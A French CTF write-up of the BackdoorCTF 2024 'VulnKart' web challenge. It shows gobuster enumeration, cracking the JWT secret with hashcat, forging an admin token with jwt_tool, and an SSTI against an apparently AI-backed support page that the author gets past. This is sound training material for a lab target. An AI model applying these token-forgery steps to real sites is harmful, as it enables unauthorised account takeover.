---
title: Backdoor 2024 - Writeups
time: 2024-12-23 18:00:00
categories: [ctf]
tags: [web,forensic]
image: /assets/posts/backdoorctf2024/icon.png
---

Mes writeups pour les challenges que j'ai réussi à résoudre durant le BackdoorCTF 2024. 

## VulnKart [Web] 45 Solves
Description: A simple shopping platform.

>http://34.71.27.111:4007/

>Author: j4ck4l

Flag: `flag{LLMs_c4n_b3_d4ng3r0us_1f_n0t_gu4rdr41l3d_w3ll}`

Nous n'avons eu aucun fichier source, juste l'url du site Web. 

```bash
┌──(kali㉿korpstation)-[~]
└─$ gobuster dir -u http://34.71.27.111:4007/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://34.71.27.111:4007/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cart                 (Status: 302) [Size: 199] [--> /login]
/checkout             (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 4029]
/logout               (Status: 302) [Size: 199] [--> /login]
/profile              (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 4305]
/search               (Status: 405) [Size: 153]
/support              (Status: 302) [Size: 199] [--> /login]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

La route ``login`` pour se connecter.

![login](/assets/posts/backdoorctf2024/login.png)


On doit préalablement s'inscrire par la route ``register``.

 ![register](/assets/posts/backdoorctf2024/register.png)

 Je m'inscris sous le username `{7*7}test1` et je me connecte. On tombe sur un site vitrine avec des articles.

![home](/assets/posts/backdoorctf2024/home.png)
 
On peut consulter les détails d'un article, l'ajouter aux favoris. Rien de ce côté ne menais vers le flag. 

En inspectant le site web nous avons un cookie de session jwt 

 `session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ins3Kjd9dGVzdDEiLCJleHAiOjE3MzQ5ODYyOTEsInJvbGUiOiJ1c2VyIn0.n4gkBy16-M8smbXV_c6TRNueb8EtyZ23Y5qDAD-xoDk`

En decodant le cookie  il contient un username, un role et un horodatage d'expiration. 

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ins3Kjd9dGVzdDEiLCJleHAiOjE3MzQ5ODYyOTEsInJvbGUiOiJ1c2VyIn0.n4gkBy16-M8smbXV_c6TRNueb8EtyZ23Y5qDAD-xoDk

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "{7*7}test1"
[+] exp = 1734986291    ==> TIMESTAMP = 2024-12-23 21:38:11 (UTC)
[+] role = "user"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

```
J'ai utilisé `hashcat` pour cracker la clé secrète. 

```bash
┌──(kali㉿korpstation)-[~/CTF/Tools/jwt_tool]
└─$ hashcat jwt /usr/share/wordlists/rockyou.txt     
hashcat (v6.2.6) starting in autodetect mode
--SNIP--
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...D-xoDk
Time.Started.....: Mon Dec 23 20:40:42 2024 (22 secs)
Time.Estimated...: Mon Dec 23 20:41:04 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   644.5 kH/s (1.26ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14262272/14344385 (99.43%)
Rejected.........: 0/14262272 (0.00%)
Restore.Point....: 14261248/14344385 (99.42%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 007857 -> 0071851013
Hardware.Mon.#1..: Util: 92%

Started: Mon Dec 23 20:40:39 2024
Stopped: Mon Dec 23 20:41:06 2024
                                                                                                                                                                                                      
┌──(kali㉿korpstation)-[~/CTF/Tools/jwt_tool]
└─$ hashcat jwt /usr/share/wordlists/rockyou.txt  --show
--SNIP--

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ins3Kjd9dGVzdDEiLCJleHAiOjE3MzQ5ODYyOTEsInJvbGUiOiJ1c2VyIn0.n4gkBy16-M8smbXV_c6TRNueb8EtyZ23Y5qDAD-xoDk:0077secret0077

```
La clé secrète étant ```0077secret0077``` je l'ai utilisé pour reforger le cookie avec un rôle admin. 

```bash
                                                                                                                                                       
┌──(kali㉿korpstation)-[~/CTF/Tools/jwt_tool]
└─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ins3Kjd9dGVzdDEiLCJleHAiOjE3MzQ5ODYyOTEsInJvbGUiOiJ1c2VyIn0.n4gkBy16-M8smbXV_c6TRNueb8EtyZ23Y5qDAD-xoDk -T -p 0077secret0077 -S hs256 

--SNIP--

Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "{7*7}test1"
[2] exp = 1734986291    ==> TIMESTAMP = 2024-12-23 21:38:11 (UTC)
[3] role = "user"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of role is: user
Please enter new value and hit ENTER
> admin
[1] username = "{7*7}test1"
[2] exp = 1734986291    ==> TIMESTAMP = 2024-12-23 21:38:11 (UTC)
[3] role = "admin"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_5e89f9de2e7d954ca69bb8007aeb69e1 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ins3Kjd9dGVzdDEiLCJleHAiOjE3MzQ5ODYyOTEsInJvbGUiOiJhZG1pbiJ9.88srhqzq-EHoJaLzx2Q-TbILoih0SC_BJmL702A0_fg

```

J'ai utilisé le nouveau jwt et j'ai réussi à me connecter en tant qu'admin. 

![admin](/assets/posts/backdoorctf2024/adminprofile.png)
![admin2](/assets/posts/backdoorctf2024/paneladmin.png)

Je pensais avoir fini avec ce défi mais c'était un trop de lapin. Le flag sur la page d'administration `flag{d0_y0u_r34lly_th1nk_th15_is_th3_r34l_fl4g}` est fake. 

Il est temps de se pencher sur les autres routes que gobuster nous a énumérés. En analysant la route `/support`
avec quelques exploits j'ai vu une vulnérabilité ssti. 

![ssti](/assets/posts/backdoorctf2024/support.png)

> Comment l'exploiter ? 

Notre site est une application web Flask python.  

![tech](/assets/posts/backdoorctf2024/wappy.png)

J'ai commencé avec les payloads hacktrics sans succès. Mais à travers les réponses j'ai constaté que nous avons affaire à une IA qui avait des restrictions sur la lecture des fichiers sensibles. 

Après plusieurs essaies j'ai utilisé ce payload pour avoir le flag :


![flag](/assets/posts/backdoorctf2024/flag.png)
